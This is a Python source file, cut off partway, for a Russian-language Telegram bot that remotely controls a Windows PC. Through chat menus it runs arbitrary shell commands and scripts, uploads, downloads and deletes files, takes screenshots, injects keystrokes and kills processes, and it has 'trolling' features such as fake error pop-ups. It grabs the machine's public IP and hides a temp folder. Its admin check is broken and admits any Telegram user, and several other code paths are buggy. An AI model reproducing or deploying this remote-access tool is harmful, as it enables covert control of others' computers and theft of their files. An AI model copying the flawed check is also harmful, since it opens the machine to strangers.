import os, pyautogui, subprocess, keyboard, psutil

from shutil import rmtree, disk_usage
from ctypes import windll
from telebot import types, TeleBot
from random import randint
from time import sleep
from platform import uname
from pygetwindow import getActiveWindowTitle
from http.client import HTTPConnection
from webbrowser import open as webopen
from datetime import datetime
from screen_brightness_control import set_brightness, get_brightness


#Настройки бота
FAST_KEYS = ["enter", "backspace", "space", "tab", "ctrl+a", "ctrl+z", "ctrl+c", "ctrl+v", "ctrl+s", "ctrl+shift+esc"]  # Быстрые клавиши (используются в меню клавиш)
FAST_CMDS = ['tasklist', 'ping']  # Быстрые команды (используются при вводе команд)
TROLL_WEBSITES = ['https://dzen.ru', 'https://youtube.com', 'https://www.google.com', 'https://yandex.ru', 'https://vk.com']  # Сайты для открытия в троллинге (используются при троллинге массовым открытием сайтов)

VERSION = '3.5.1'  # Версия бота
TOKEN = ""  # Токен бота
FIRST_ID = 123569658  # ID главного админа (обязтаельно к заполнению)
SECOND_ID = 0  # ID второго админа (необязательно к заполнению). Оставьте 0, если в нем нет необходимости

SAMP_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска SAMP
RAKLITE_ROUTE = ""  # Оставьте пустым, если не хотите использовать функции запуска RakSamp Lite

bot = TeleBot(TOKEN, parse_mode=None)  #Токен
pyautogui.FAILSAFE = False

#//////////////////////////////////////////////////////////
def make_temp_folder():    
    os.mkdir(r'C:\temp')
    kernel32 = windll.kernel32
    attr = kernel32.GetFileAttributesW(r'C:\temp')
    kernel32.SetFileAttributesW(r'C:\temp', attr | 2)
    return True


def is_access_denied(id: int):
    if (FIRST_ID and SECOND_ID) != id: return False
    return True

#//////////////////////////////////////////////////////////
conn = HTTPConnection("ifconfig.me")
try:
    conn.request("GET", "/ip")
    ip = conn.getresponse().read()
except:
    ip = "Неизвестно"

total_mem, used_mem, free_mem = disk_usage('.')
gb = 10 ** 9
login = os.getlogin()
width, height = pyautogui.size()
oper = uname()
try: virtual_memory = psutil.virtual_memory()
except: virtual_memory = 'нет информации'

try: battery = psutil.sensors_battery()[0]
except: battery = 'нет информации'


@bot.message_handler(commands=['start'])
def start(message: types.Message):
    if is_access_denied(message.chat.id): return None
    return mainmenu(message)

def mainmenu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("/start", "Консоль", "Настройки ПК", "Файлы и папки", "Клавиши", "Троллинг",
                                                                                             "SAMP функции", "Меню биндов", "Особые функции")
    bot.send_message(message.chat.id, '*📌 Вы в главном меню!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_main)

def check_main(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Файлы и папки': return files_menu(message)
    elif message.text.strip() == 'Консоль': return console_menu(message)
    elif message.text.strip() == 'Клавиши': return keyboard_menu(message)
    elif message.text.strip() == 'Меню биндов': return bind_menu(message)
    elif message.text.strip() == 'Троллинг': return packs(message)
    elif message.text.strip() == 'Особые функции': return other_functions(message)
    elif message.text.strip() == 'SAMP функции': return samp_menu(message)
    elif message.text.strip() == 'Настройки ПК': return pc_settings(message)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return mainmenu(message)


def console_commands(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)

    try:
        output=subprocess.getoutput(message.text.strip(), encoding='cp866')

        if len(output) > 1999:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder

            bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли оказался *слишком длинным* и был *сохранен в файл ниже*!', parse_mode = "Markdown")
            my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
            my_file.write(output)
            my_file.close()
            bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
            os.remove('C:\\temp\\ConsoleOutput.txt')
            return bot.register_next_step_handler(message, console_commands)

        bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
        bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли выше', parse_mode = "Markdown")
        return bot.register_next_step_handler(message, console_commands)

    except:
        bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли оказался *пустой строкой*!', parse_mode = "Markdown")
        return bot.register_next_step_handler(message, console_commands)


def python_scripts(message: types.Message):
    if is_access_denied(message.chat.id): return None

    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return console_menu(message)
    
    bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был запущен!*', parse_mode = "Markdown")
    console_menu(message)

    try:
        output=subprocess.getoutput(f'python {message.text.strip()}', encoding='cp866')
        bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был успешно выполнен!\nЛог ниже*', parse_mode = "Markdown")
        return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

    except: return bot.send_message(message.chat.id, f'❌ *Python скрипт по пути {message.text.strip()} не был запущен из-за ошибки!*', parse_mode = "Markdown")


def create_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return files_menu(message)
        
    try:
        my_file = open(message.text.strip(), "w")
        my_file.close()
        bot.send_message(message.chat.id, '✍️ *Введите содержимое файла!*', parse_mode='Markdown')
        bot.register_next_step_handler(message, create_file_check, message.text.strip())

    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
        return files_menu(message)

def create_file_check(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None      
    
    if message.text.strip() == '/start': return start(message)

    with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
    bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан!', parse_mode="Markdown")
    return files_menu(message)


def change_file_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Добавить содержимое", "Полностью изменить содержимое", "Очистить файл", "Назад")
    bot.send_message(message.chat.id, '*✍️ Выберите действие!*', reply_markup=markup, parse_mode="Markdown")
    return bot.register_next_step_handler(message, change_file_check)
    
def change_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == "Добавить содержимое": return add_in_file_content(message)
    elif message.text.strip() == "Очистить файл": return clean_file(message)
    elif message.text.strip() == "Полностью изменить содержимое": return change_file(message)

    bot.send_message(message.chat.id, '❌ *Неверный выбор!* Повторите попытку', parse_mode="Markdown")
    return change_file_menu(message)


def change_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
    return bot.register_next_step_handler(message, change_file_new_content)

def change_file_new_content(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return change_file_menu(message)

    bot.send_message(message.chat.id, '✍️ *Укажите новое содержимое!*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, change_file_finish, message.text.strip())

def change_file_finish(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    try:
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == 'Назад': return change_file_menu(message)

        with open(route, 'w+', encoding = 'utf-8') as file: file.write(message.text.strip())
        bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно изменен!', parse_mode="Markdown")
        return change_file_menu(message)

    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует!*', parse_mode="Markdown")
        return change_file_menu(message)


def clean_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
    return bot.register_next_step_handler(message, clean_file_check)

def clean_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return change_file_menu(message)

    try:
        with open(message.text.strip(), 'w+', encoding = 'utf-8') as file: file.write("")
        bot.send_message(message.chat.id, f'☑️ Файл *{message.text.strip()}* был успешно очищен!', parse_mode='Markdown')
        return change_file_menu(message)
    
    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует*', parse_mode='Markdown')
        return change_file_menu(message)


def add_in_file_content(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '✍️ *Введите название файла с расширением или путь до нужного файла*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, add_in_file_text)

def add_in_file_text(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад':return change_file_menu(message)

    bot.send_message(message.chat.id, '✍️ *Укажите, что нужно добавить!*', parse_mode='Markdown')
    return bot.register_next_step_handler(message, add_in_file_finish, message.text.strip())

def add_in_file_finish(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return change_file_menu(message)

    try:
        with open(route, 'w+', encoding='utf-8') as file: file.write(message.text.strip()) 
        bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан/изменен!', parse_mode='Markdown')
        return change_file_menu(message)
    
    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует!*', parse_mode='Markdown')
        return change_file_menu(message)


def delete_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Удалить файл", "Удалить папку", "Назад")
    bot.send_message(message.chat.id, '✍️ *Выберите то, что необходимо*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, check_delete_menu)

def check_delete_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return files_menu(message)
    elif message.text.strip() == 'Удалить папку': return delete_folder(message)
    elif message.text.strip() == 'Удалить файл': return delete_file(message)
        
    bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
    return delete_menu(message)


def delete_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '*✍️ Введите путь к файлу, который надо удалить (либо просто название файла с расширением, если он в текущей папке)!*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, delete_file_check)

def delete_file_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return delete_menu(message)

    try: os.remove(message.text.strip())
    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *файл не был найден или отсутствует доступ!*\nПовторите попытку позже', parse_mode='Markdown')
        return delete_menu(message)
            
    bot.send_message(message.chat.id, f'☑️ Файл по пути *{message.text.strip()}* был успешно удален!', parse_mode = "Markdown")
    return delete_menu(message)


def delete_folder(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_message(message.chat.id, '*✍️ Введите путь к папке, которую надо удалить!*', parse_mode='Markdown', reply_markup=markup)
    return bot.register_next_step_handler(message, delete_folder_check)

def delete_folder_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return delete_menu(message)
        
    try: rmtree(message.text.strip())
    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *папка не была найдена или к ней отсутствует доступ!*\nПовторите попытку', parse_mode='Markdown')
        return delete_menu(message)

    bot.send_message(message.chat.id, f'☑️ Папка по пути *{message.text.strip()}* была удалена!', parse_mode = "Markdown")
    return delete_menu(message)


def download_on_pc_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Выгрузить фото", "Выгрузить другое", "Назад")
    bot.send_message(message.chat.id, '*⚽️ Вы в меню выгрузки файлов!*', reply_markup=markup, parse_mode="Markdown")
    bot.register_next_step_handler(message, check_download_on_pc)

def check_download_on_pc(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Выгрузить фото':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженное фото\n(Пример: C:\\pon.jpg)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, download_photo)

    elif message.text.strip() == 'Выгрузить другое':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженный файл\n(Пример: C:\\pon.txt)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, download_file_on_pc)
        
    bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
    return download_on_pc_menu(message)


def download_file_on_pc(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return download_file_on_pc1(message)

    bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())

def download_file_on_pc1(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
        
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        with open(route, 'wb', encoding='utf-8') as new_file: new_file.write(downloaded_file)
        bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
        return download_on_pc_menu(message)

    except:
        bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
        return download_on_pc_menu(message)


def download_photo(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return download_file_on_pc1(message)

    bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
    return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())

def download_photo_on_pc(message: types.Message, route: str):
    if is_access_denied(message.chat.id): return None
    
    file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    try:
        with open(route, 'wb') as new_file: new_file.write(downloaded_file)
        bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
        return download_on_pc_menu(message)
    
    except:
        bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
        return download_on_pc_menu(message)


def files_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Создание файлов/папок", "Удаление файлов/папок", "Изменение файлов", "Запустить файл/программу",
                                                                                             "Скачать файл с ПК", "Выгрузить файл на ПК", "Назад")
    bot.send_message(message.chat.id, '*🗂 Вы в меню файлов!*', reply_markup=markup, parse_mode="Markdown")
    return bot.register_next_step_handler(message, files_menu_check)

def files_menu_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Изменение файлов':  return change_file_menu(message)
    elif message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == 'Удаление файлов/папок': return delete_menu(message)
    elif message.text.strip() == 'Выгрузить файл на ПК': return download_on_pc_menu(message)
    elif message.text.strip() == 'Создание файлов/папок':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Создать файл", "Создать папку", "Назад")
        bot.send_message(message.chat.id, '*✍️ Выберите то, что необходимо создать или вернитесь назад!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, check_create)

    elif message.text.strip() == 'Запустить файл/программу':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла (Пример: test.txt), если файл не из этой папки, введите полный путь!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, open_file)

    elif message.text.strip() == 'Скачать файл с ПК':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла (Пример: test.txt), если файл не из этой папки, введите полный путь (до 50 мб)*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_file)

    bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode='Markdown')
    return files_menu(message)


def check_create(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return files_menu(message)
    elif message.text.strip() == '/start': return start(message)
    if message.text.strip() == 'Создать файл':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt)!*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, create_file)

    elif message.text.strip() == 'Создать папку':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '*✍️ Введите путь к новой папке или просто введите ее название, если хотите ее создать в месте, где запущен скрипт\n\n❗️ Пример пути: C:\\Новая папка*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, create_folder)

    bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode="Markdown")
    return files_menu(message)

def create_folder(message: types.Message):
    if is_access_denied(message.chat.id): return None

    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return files_menu(message)
    try: os.mkdir(message.text.strip())
    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
        return files_menu(message)
    
    bot.send_message(message.chat.id, f'*☑️ Папка по пути "{message.text.strip()}" была успешно создана!*', parse_mode="Markdown")
    return files_menu(message)


def download_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return files_menu(message)

    try: bot.send_document(message.chat.id, open(message.text.strip(), 'rb')) 
    except: bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует*', parse_mode='Markdown')
        
    return files_menu(message)


def open_file(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "/start": return start(message)
    elif message.text.strip() == 'Назад': return files_menu(message)
            
    try: os.startfile(message.text.strip())
    except: bot.send_message(message.chat.id, '❌ *Файл не найден или отсутствует доступ!* Повторите попытку', parse_mode="Markdown")
    else: bot.send_message(message.chat.id, f'*☑️ Файл {message.text.strip()} успешно запущен!*', parse_mode="Markdown")
    
    return files_menu(message)



def create_error(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return console_menu(message)

    bot.send_message(message.chat.id, '❗️ *Впишите содержимое ошибки!*', parse_mode='Markdown')
    return bot.register_next_step_handler(message, create_error_check, message.text.strip())

def create_error_check(message: types.Message, title: str):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return console_menu(message)

    bot.send_message(message.chat.id, '❗️ *Ошибка успешно создана!*', parse_mode='Markdown')
    console_menu(message)
    return windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)


def console_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard=True).add("Ввод команд", "Запустить Python скрипт", "Сделать скриншот", "Открыть сайт",
               "Создать ошибку", "Список процессов", "Назад")
    bot.send_message(message.chat.id, '💻 *Вы в меню консоли!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, console_menu_check)

def console_menu_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Список процессов': return process_list(message)
    elif message.text.strip() == 'Ввод команд': 
            markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard=True).add(*FAST_CMDS, "Назад", row_width=2)
            bot.send_message(message.chat.id, '🖥 *Введите команду для консоли!\n\n❗️ При любых непонятных ситуациях вводите /start*', reply_markup=markup, parse_mode='Markdown')
            return bot.register_next_step_handler(message, console_commands)

    elif message.text.strip() == 'Сделать скриншот':
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()

            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))
            return console_menu(message)

        except PermissionError:
            bot.send_message(message.chat.id, '❌ *У бота недостаточно прав!*', parse_mode='Markdown')
            return console_menu(message)

    elif message.text.strip() == 'Создать ошибку':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '❗️ *Введите заголовок ошибки!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, create_error)

    elif message.text.strip() == 'Запустить Python скрипт':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '❗️ *Введите путь скрипта!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, python_scripts)

    elif message.text.strip() == 'Открыть сайт':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '✍️ *Введите адрес сайта!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, open_site)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return console_menu(message)


def process_list(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    processes = 'Список процессов:\n\n'
    for i in psutil.pids():
        try: processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'    
        except: continue
                
    if os.path.exists('C:\\temp\\') == False: make_temp_folder()

    bot.send_message(message.chat.id, f'☑️ Cписок процессов был *сохранен в файл ниже*!\n\nВведите *ID процесса* для уничтожения или *нажмите на кнопку "Назад"*', parse_mode = "Markdown")
    with open("C:\\temp\\processes.txt", "w", encoding="utf-8") as file: file.write(processes)

    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
    bot.send_document(message.chat.id, document = open('C:\\temp\\processes.txt', 'rb'), reply_markup=markup)
    os.remove('C:\\temp\\processes.txt')
    return bot.register_next_step_handler(message, check_process_list)

def check_process_list(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip().isdigit() == False:
        bot.send_message(message.chat.id, '❌ *Произошла ошибка! ID процесса должно быть числом*', parse_mode='Markdown')
        return console_menu(message)
        
    kill_id = int(message.text.strip())
    parent = psutil.Process(kill_id)

    try:
        for child in parent.children(recursive=True): child.kill()
        parent.kill()
        
    except psutil.NoSuchProcess: bot.send_message(message.chat.id, '❌ *Произошла ошибка! Процесса с таким ID не существует*', parse_mode='Markdown')
    except psutil.AccessDenied: bot.send_message(message.chat.id, '❌ *Произошла ошибка! Для уничтожения данного процесса недостаточно прав*', parse_mode='Markdown')
    finally: bot.send_message(message.chat.id, f'☑️ Процесс с ID *{kill_id}* был успешно уничтожен!', parse_mode = "Markdown")
    return console_menu(message)


def open_site(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return console_menu(message)
    elif message.text.strip() == '/start': return start(message)

    webopen(message.text.strip(), new=2)
    bot.send_message(message.chat.id, f'☑️ *Вы успешно открыли {message.text.strip()}*', parse_mode='Markdown')
    return console_menu(message)


def media_keys(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Пауза/Старт", "Перемотка вперёд", "Назад")
    bot.send_message(message.chat.id, '⌨️ *Вы в меню медиа-клавиш!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, media_keys_check)

def media_keys_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Назад': return keyboard_menu(message)
    elif message.text.strip() == 'Пауза/Старт': keyboard.send('play/pause media')
    elif message.text.strip() == 'Перемотка вперёд': keyboard.send('alt+right')

    return media_keys(message)


def keyboard_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Напечатать что-то", "Нажать клавиши", "Медиа-клавиши", "Назад")
    bot.send_message(message.chat.id, '⌨️ *Вы в меню клавиатуры!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_check)

def keyboard_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == 'Назад': return mainmenu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() == 'Напечатать что-то': return keyboard_write(message)
    elif message.text.strip() == 'Нажать клавиши': return keyboard_keys(message)
    elif message.text.strip() == 'Медиа-клавиши': return media_keys(message)

    bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
    return keyboard_menu(message)


def keyboard_write(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*FAST_KEYS, "Назад", row_width=2)
    bot.send_message(message.chat.id, '⌨️ *Впишите то, что хотите написать c помощью клавиатуры, или выберите горячие клавиши из списка ниже!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_write_check)

def keyboard_write_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "Назад": return keyboard_menu(message)
    elif message.text.strip() == '/start': return start(message)
    elif message.text.strip() in FAST_KEYS: keyboard.press(message.text.strip())
    else: keyboard.write(message.text.strip(), delay=0.2)

    return keyboard_write(message)


def keyboard_keys(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add(*FAST_KEYS, "Назад", row_width=2)
    bot.send_message(message.chat.id, '⌨️ *Впишите или выберите ниже то, что хотите выполнить!\n\nПримеры:\nalt - нажмется только alt\nalt+f4 - alt и f4 нажмутся вместе*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, keyboard_keys_check)

def keyboard_keys_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "Назад": return keyboard_menu(message)
    elif message.text.strip() == '/start': return start(message)

    try: keyboard.send(message.text.strip())
    except ValueError: bot.send_message(message.chat.id, '❌ *Одна или несколько из клавиш не была найдена! Повторите попытку*', parse_mode='Markdown')
    
    return keyboard_keys(message)


def samp_menu(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Подключение к SAMP серверу", "Подключение к RakLaunch Lite", "Назад")
    bot.send_message(message.chat.id, '*😇 Вы в меню SAMP!*', reply_markup=markup, parse_mode='Markdown')
    return bot.register_next_step_handler(message, samp_check)

def samp_check(message: types.Message):
    if is_access_denied(message.chat.id): return None
    
    if message.text.strip() == "Назад": return mainmenu(message)
    elif message.text.strip() == "/start": return start(message)
    elif message.text.strip() == 'Подключение к SAMP серверу':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
        bot.send_message(message.chat.id, '✍️ *Введите IP сервера, на который вы хотите зайти!\n\nP.s. будет использоваться ник, под которым вы играли в последний раз!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, samp_connect)

    elif message.text.strip() == 'Подключение к RakLaunch Lite':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard = True, resize_keyboard = True).add("Назад")
